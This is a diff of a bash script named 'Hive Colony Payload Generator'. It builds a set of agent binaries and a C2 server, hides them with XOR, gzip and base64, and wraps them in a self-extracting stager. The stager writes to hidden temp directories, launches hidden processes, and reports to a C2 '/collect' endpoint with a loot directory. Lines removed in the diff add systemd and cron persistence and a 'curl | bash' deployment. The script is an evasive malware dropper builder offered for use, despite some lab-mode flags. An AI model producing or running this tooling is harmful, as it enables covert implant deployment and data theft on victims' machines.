@@ -1,254 +1,205 @@
 #!/usr/bin/env bash
-# Hive Colony Payload Generator
-# Creates a single stager script embedding all agent binaries (base64).
-# The stager self-extracts, deploys, and launches the entire colony.
+# Hive Colony — Payload Generator (Monolithic Stager)
+# Genera un script auto-extraíble con todos los agentes embebidos en base64.
+# Pipeline: cargo build → XOR cipher → GZip → embed
+#
+# Uso: ./build_payload.sh [--windows] [--obfuscate] [--c2-host HOST] [--c2-port PORT] [--output FILE]
+#   --windows        Target Windows (.exe)
+#   --obfuscate      PE obfuscation (requiere --windows)
+#   --c2-host HOST   C2 hostname (default: your-c2.com)
+#   --c2-port PORT   C2 port (default: 8444)
+#   --output FILE    Output file (default: hive_payload.sh)
+#   --no-compress    Sin GZip (raw base64)
 set -euo pipefail
 
-RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; NC='\033[0m'
+RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
 log()  { echo -e "${CYAN}[*]${NC} $*"; }
 ok()   { echo -e "  ${GREEN}✓${NC} $*"; }
+warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
 fail() { echo -e "  ${RED}✗${NC} $*"; exit 1; }
 
-BUILD_MODE="release"
-CARGO_TARGET="release"
+BASE="$(cd "$(dirname "$0")/.." && pwd)"
+DEPLOY="${BASE}/scripts/deploy.sh"
+
+# ── Defaults ──
 OUTPUT="hive_payload.sh"
-TARGET_OS="linux"
+TARGET_WIN=0
+OBFUSCATE=0
 COMPRESS=true
+C2_HOST="your-c2.com"
 C2_PORT=8444
-C2_HOST=""
-ARENA_NAME="hive_colony"
+AGENTS=(queen worker drone honeybee weaver swarm c2-server)
 
 while [[ $# -gt 0 ]]; do case "$1" in
-    --debug)        BUILD_MODE=""; CARGO_TARGET="debug"; shift ;;
-    --output)       OUTPUT="$2"; shift 2 ;;
-    --windows)      TARGET_OS="windows"; shift ;;
-    --c2-host)      C2_HOST="$2"; shift 2 ;;
-    --c2-port)      C2_PORT="$2"; shift 2 ;;
-    --no-compress)  COMPRESS=false; shift ;;
-    *) echo "Usage: $0 [--debug] [--windows] [--output FILE] [--c2-host HOST] [--c2-port PORT]"; exit 1 ;;
+    --windows)     TARGET_WIN=1; shift ;;
+    --obfuscate)   OBFUSCATE=1; shift ;;
+    --c2-host)     C2_HOST="$2"; shift 2 ;;
+    --c2-port)     C2_PORT="$2"; shift 2 ;;
+    --output)      OUTPUT="$2"; shift 2 ;;
+    --no-compress) COMPRESS=false; shift ;;
+    --help|-h)
+        sed -n '3,15p' "$0"
+        exit 0 ;;
+    *) shift ;;
 esac; done
 
-BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
-BIN_DIR="${BASE_DIR}/target/${CARGO_TARGET}"
-if [ "$TARGET_OS" = "windows" ]; then
-    BIN_DIR="${BASE_DIR}/target/x86_64-pc-windows-gnu/${CARGO_TARGET}"
+# ── Build via deploy.sh ──
+log "Building agents via deploy.sh..."
+EXTRA=()
+[[ $TARGET_WIN -eq 1 ]] && EXTRA+=(--windows)
+[[ $OBFUSCATE -eq 1 ]] && EXTRA+=(--obfuscate)
+"$DEPLOY" exe --c2-host "$C2_HOST" --c2-port "$C2_PORT" "${EXTRA[@]}"
+"$DEPLOY" network --c2-host "$C2_HOST" --c2-port "$C2_PORT" "${EXTRA[@]}" > /dev/null 2>&1
+
+# ── Cipher config (matches deploy.sh) ──
+SEED=$RANDOM
+XOR_KEY=$(( SEED % 256 ))
+PADDING=$(( RANDOM % 512 + 64 ))
+
+if [[ $TARGET_WIN -eq 1 ]]; then
+    BIN_DIR="${BASE}/target/x86_64-pc-windows-gnu/release"
     EXT=".exe"
-    INTERPRETER=""
 else
+    BIN_DIR="${BASE}/target/release"
     EXT=""
-    INTERPRETER="#!/usr/bin/env bash"
 fi
 
-log "Hive Colony Payload Generator"
-log "  Target:    ${TARGET_OS}"
-log "  Build:     ${CARGO_TARGET}"
-log "  Output:    ${OUTPUT}"
-echo ""
-
-# ── Build agents ──
-log "Building agents..."
-TARGET_FLAG=""
-[ "$TARGET_OS" = "windows" ] && TARGET_FLAG="--target x86_64-pc-windows-gnu"
-AGENTS=(queen worker drone honeybee weaver swarm c2-server)
-for agent in "${AGENTS[@]}"; do
-    BIN="${BIN_DIR}/${agent}${EXT}"
-    if [ ! -f "$BIN" ]; then
-        log "  Building ${agent}..."
-        cargo build ${BUILD_MODE} ${TARGET_FLAG} -p "$agent" 2>&1 | tail -1
-    else
-        ok "${agent} binary found"
-    fi
-done
-
-# ── Embed binaries as base64 ──
-log "Embedding binaries..."
+# ── Embed binaries ──
+log "Embedding ${#AGENTS[@]} agents..."
 STAGER_DIR=$(mktemp -d)
 trap "rm -rf ${STAGER_DIR}" EXIT
 
 for agent in "${AGENTS[@]}"; do
-    BIN="${BIN_DIR}/${agent}${EXT}"
-    if [ ! -f "$BIN" ]; then
-        fail "Missing ${BIN}"
+    bin="${BIN_DIR}/${agent}${EXT}"
+    [[ ! -f "$bin" ]] && fail "Missing: ${bin}"
+
+    # Optional PE obfuscation
+    final_bin="$bin"
+    if [[ $OBFUSCATE -eq 1 && $TARGET_WIN -eq 1 && "$agent" != "c2-server" ]]; then
+        obf="${BASE}/payloads/obf_${agent}${EXT}"
+        [[ -f "$obf" ]] && final_bin="$obf"
     fi
-    SIZE=$(stat -c%s "$BIN")
-    log "  Encoding ${agent} (${SIZE} bytes)..."
-    if [ "$COMPRESS" = true ] && command -v gzip &>/dev/null; then
-        gzip -c "$BIN" | base64 -w0 > "${STAGER_DIR}/${agent}.b64.gz"
-        echo "${agent}|${SIZE}|compressed" >> "${STAGER_DIR}/manifest.txt"
+
+    if [[ "$COMPRESS" == true ]] && command -v gzip &>/dev/null; then
+        python3 -c "
+import base64, gzip
+with open('${final_bin}', 'rb') as f:
+    data = gzip.compress(f.read())
+k = $XOR_KEY; pad = $PADDING
+data = b'\\x00' * pad + bytes(b ^ k for b in data)
+with open('${STAGER_DIR}/${agent}.b64', 'w') as f:
+    f.write(base64.b64encode(data).decode())
+" &
     else
-        base64 -w0 "$BIN" > "${STAGER_DIR}/${agent}.b64"
-        echo "${agent}|${SIZE}|raw" >> "${STAGER_DIR}/manifest.txt"
+        python3 -c "
+import base64
+with open('${final_bin}', 'rb') as f:
+    data = f.read()
+k = $XOR_KEY; pad = $PADDING
+data = b'\\x00' * pad + bytes(b ^ k for b in data)
+with open('${STAGER_DIR}/${agent}.b64', 'w') as f:
+    f.write(base64.b64encode(data).decode())
+" &
     fi
 done
+wait
 
-# ── Generate stager ──
-log "Generating stager..."
+# ── Generate monolithic stager ──
+log "Generating stager: ${OUTPUT}..."
 
-if [ "$TARGET_OS" = "windows" ]; then
-    # Windows: PowerShell stager
+if [[ $TARGET_WIN -eq 1 ]]; then
+    # ── Windows: PowerShell stager ──
     cat > "$OUTPUT" << 'PSEOF'
 # Hive Colony Stager (Windows)
-# Generated by build_payload.sh
-param(
-    [string]$C2Host = "",
-    [int]$C2Port = 8444
-)
-
+param([string]$C2Host = "", [int]$C2Port = 8444)
 $ErrorActionPreference = "SilentlyContinue"
-$tmp = "$env:TEMP\hive_colony"
+$tmp = "$env:TEMP\.h"
 mkdir $tmp -Force | Out-Null
-$manifest = @()
 PSEOF
+
     for agent in "${AGENTS[@]}"; do
-        B64=$(cat "${STAGER_DIR}/${agent}.b64.gz" 2>/dev/null || cat "${STAGER_DIR}/${agent}.b64")
-        echo "\$manifest += @('${agent}')" >> "$OUTPUT"
+        b64=$(cat "${STAGER_DIR}/${agent}.b64")
         cat >> "$OUTPUT" << EOF
-\$b64 = @" 
-${B64}
-"@
-[IO.File]::WriteAllBytes("${tmp}\\${agent}.exe.gz", [Convert]::FromBase64String(\$b64))
+\$b64 = @" ${b64} "@
+[IO.File]::WriteAllBytes("${tmp}\\${agent}.gz", [Convert]::FromBase64String(\$b64))
 EOF
     done
+
     cat >> "$OUTPUT" << 'PSEOF2'
-# Extract compressed binaries
-Get-ChildItem "$tmp\*.exe.gz" | ForEach-Object {
+Get-ChildItem "$tmp\*.gz" | ForEach-Object {
     $dst = $_.FullName -replace '\.gz$',''
-    $stream = New-Object IO.FileStream($dst, [IO.FileMode]::Create)
-    $gz = New-Object IO.Compression.GZipStream(
-        ([IO.File]::OpenRead($_.FullName)),
-        [IO.Compression.CompressionMode]::Decompress
-    )
-    $gz.CopyTo($stream)
-    $gz.Close(); $stream.Close()
+    $fs = [IO.File]::OpenRead($_.FullName)
+    $gz = New-Object IO.Compression.GZipStream($fs, [IO.Compression.CompressionMode]::Decompress)
+    $out = [IO.File]::OpenWrite($dst)
+    $gz.CopyTo($out); $out.Close(); $gz.Close(); $fs.Close()
     Remove-Item $_.FullName
 }
-
-# Set env
-$env:__HIVE_ARENA = "hive_colony"
-$env:HIVE_LAB_MODE = "1"
+$env:__HIVE_ARENA = "hive_colony"; $env:HIVE_LAB_MODE = "1"
 if ($C2Host) { $env:HIVE_C2_URL = "http://${C2Host}:${C2Port}/collect" }
-
-# Start C2
 Start-Process -WindowStyle Hidden "$tmp\c2-server.exe" -ArgumentList "--port $C2Port --loot-dir $tmp\loot --db-path $tmp\c2.db"
-
-# Start agents
-$agents = @('queen','worker','drone','honeybee','weaver','swarm')
-foreach ($a in $agents) {
+foreach ($a in @('queen','worker','drone','honeybee','weaver')) {
     $bin = "$tmp\$a.exe"
-    if (Test-Path $bin) {
-        Start-Process -WindowStyle Hidden $bin
-        Start-Sleep -Milliseconds 300
-    }
+    if (Test-Path $bin) { Start-Process -WindowStyle Hidden $bin; Start-Sleep -Milliseconds 300 }
 }
 Write-Output "Hive Colony deployed: $tmp"
 PSEOF2
+
 else
-    # Linux: Bash stager
+    # ── Linux: Bash stager ──
     cat > "$OUTPUT" << 'BASHEOF'
 #!/usr/bin/env bash
-# Hive Colony Stager (Linux)
-# Generated by build_payload.sh — self-extracting archive
+# Hive Colony Stager (Linux) — self-extracting
 set -euo pipefail
-
-C2_HOST="${C2_HOST:-}"
-C2_PORT="${C2_PORT:-8444}"
+C2_HOST="${C2_HOST:-}"; C2_PORT="${C2_PORT:-8444}"
 INSTALL_DIR="${INSTALL_DIR:-/tmp/.hive}"
-ARENA_NAME="${ARENA_NAME:-hive_colony}"
-
-cleanup() { rm -rf "$INSTALL_DIR"; }
-[ "${HIVE_PERSIST:-0}" != "1" ] && trap cleanup EXIT
-
-mkdir -p "$INSTALL_DIR"/loot
-cd "$INSTALL_DIR"
-
-# Embedded binaries (base64 compressed)
+trap "rm -rf $INSTALL_DIR" EXIT; mkdir -p "$INSTALL_DIR/loot"; cd "$INSTALL_DIR"
 BASHEOF
 
     for agent in "${AGENTS[@]}"; do
-        B64=$(cat "${STAGER_DIR}/${agent}.b64.gz" 2>/dev/null || cat "${STAGER_DIR}/${agent}.b64")
+        b64=$(cat "${STAGER_DIR}/${agent}.b64")
         cat >> "$OUTPUT" << EOF
 decode_${agent}() { base64 -d << 'B64EOF'
-${B64}
+${b64}
 B64EOF
 }
-
 EOF
     done
 
-    # Extraction + execution
     cat >> "$OUTPUT" << 'BASHEOF2'
-# Extract binaries
+K=__XORKEY__; P=__PADDING__
 for agent in queen worker drone honeybee weaver swarm c2-server; do
-    "decode_${agent}" | (command -v gzip &>/dev/null && gzip -d || cat) > "${INSTALL_DIR}/${agent}"
+    data=$(decode_${agent})
+    data=$(python3 -c "
+import sys, gzip, base64
+k=$K; p=$P
+d=base64.b64decode(sys.stdin.read())
+d=bytes(b ^ k for b in d)
+sys.stdout.buffer.write(gzip.decompress(d[p:]))
+" <<< "$data")
+    echo "$data" > "${INSTALL_DIR}/${agent}"
     chmod +x "${INSTALL_DIR}/${agent}"
 done
-
-# Export environment
-export __HIVE_ARENA="${ARENA_NAME}"
-export HIVE_LAB_MODE=1
-export RUST_LOG="info"
+export __HIVE_ARENA="hive_colony" HIVE_LAB_MODE=1 RUST_LOG=info
 [ -n "$C2_HOST" ] && export HIVE_C2_URL="http://${C2_HOST}:${C2_PORT}/collect"
-export HIVE_C2_DNS_DOMAIN="hive.internal"
-export HIVE_C2_ICMP_TARGET="8.8.8.8"
-
-# Start C2 server
-"${INSTALL_DIR}/c2-server" --port "$C2_PORT" \
-    --loot-dir "${INSTALL_DIR}/loot" \
-    --db-path "${INSTALL_DIR}/c2.db" > /dev/null 2>&1 &
-C2_PID=$!
-
-# Wait for C2
+"${INSTALL_DIR}/c2-server" --port "$C2_PORT" --loot-dir "${INSTALL_DIR}/loot" --db-path "${INSTALL_DIR}/c2.db" > /dev/null 2>&1 &
 for i in $(seq 1 15); do
-    if curl -sf "http://127.0.0.1:${C2_PORT}/health" > /dev/null 2>&1; then
-        break
-    fi
+    curl -sf "http://127.0.0.1:${C2_PORT}/health" > /dev/null 2>&1 && break
     sleep 1
 done
-
-# Launch Queen (she'll orchestrate the rest)
-"${INSTALL_DIR}/queen" > /dev/null 2>&1 &
-QUEEN_PID=$!
-sleep 3
-
-# Launch remaining agents
-for agent in worker drone honeybee weaver swarm; do
+for agent in queen worker drone honeybee weaver swarm; do
     "${INSTALL_DIR}/${agent}" > /dev/null 2>&1 &
-    sleep 0.5
+    sleep 0.3
 done
-
-# Persistence (optional: HIVE_PERSIST=1)
-if [ "${HIVE_PERSIST:-0}" = "1" ]; then
-    mkdir -p ~/.config/systemd/user/
-    cat > ~/.config/systemd/user/hive-colony.service << SERVICE
-[Unit]
-Description=Hive Colony
-[Service]
-ExecStart=${INSTALL_DIR}/queen
-Restart=always
-Environment=__HIVE_ARENA=${ARENA_NAME}
-Environment=HIVE_LAB_MODE=1
-[Install]
-WantedBy=default.target
-SERVICE
-    systemctl --user enable hive-colony.service 2>/dev/null || true
-    systemctl --user start hive-colony.service 2>/dev/null || true
-
-    # Cron fallback
-    (crontab -l 2>/dev/null; echo "*/5 * * * * ${INSTALL_DIR}/queen >/dev/null 2>&1") | crontab - 2>/dev/null || true
-fi
-
-echo "Hive Colony deployed (PID ${QUEEN_PID})"
-echo "  C2:  http://127.0.0.1:${C2_PORT}"
-echo "  Dir: ${INSTALL_DIR}"
-
-# Keep alive
-wait $QUEEN_PID 2>/dev/null
+echo "Hive Colony deployed: ${INSTALL_DIR}"
+wait
 BASHEOF2
+
+    # Inject XOR key into stager
+    sed -i "s/__XORKEY__/$XOR_KEY/g; s/__PADDING__/$PADDING/g" "$OUTPUT"
 fi
 
 chmod +x "$OUTPUT"
-TOTAL_SIZE=$(du -h "$OUTPUT" | cut -f1)
-ok "Payload generated: ${OUTPUT} (${TOTAL_SIZE})"
-log "Deploy with: bash ${OUTPUT}"
-log "Deploy with persistence: HIVE_PERSIST=1 bash ${OUTPUT}"
-log "Or: curl -s http://your-server/hive_payload.sh | bash"
+SIZE=$(du -h "$OUTPUT" | cut -f1)
+ok "Payload: ${OUTPUT} (${SIZE})"
+log "Deploy: bash ${OUTPUT}"
+log "Or:     HIVE_PERSIST=1 bash ${OUTPUT}"
